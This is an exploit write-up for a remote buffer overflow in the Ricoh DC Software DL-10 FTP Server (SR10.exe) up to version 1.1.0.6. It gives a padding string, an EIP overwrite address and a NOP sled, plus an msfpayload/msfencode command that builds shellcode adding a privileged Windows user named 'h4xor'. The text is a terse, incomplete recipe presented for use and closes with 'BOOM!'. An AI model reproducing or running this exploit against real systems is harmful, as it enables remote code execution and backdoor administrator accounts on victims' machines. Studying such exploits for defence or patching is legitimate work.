Ricoh-DC-Software-DL-10-FTP-Server-SR10.exe-
============================================
Exploit Title: Ricoh DC Software DL-10 FTP Server (SR10.exe) <= 1.1.0.6 Remote Buffer Overflow Vulnerability
Version:       <= 1.1.0.6
Date:          December 2014
Author:        jasonsslim
Homepage:      www.jasonsslim.info
Tested on:     Windows 2K13

Ricoh DC Software DL-10 FTP Server (SR10.exe) &lt;= 1.1.0.6 - Remote Buffer Overflow Vulnerability

Search for JMP ESP from ntdll.dll and edit the shellcode as below:

junk = "\x41" * 245
eip = "\x77\xFB\x8B\xAB"
nops = "\x90" * 10

Create privileged user shellcode with the following:
msfpayload windows/adduser USER=h4xor PASS=H4xor@1234 R | msfencode -e x86/shikata_ga_nai -b '\x00\x0a\x0d'

and...


BOOM!
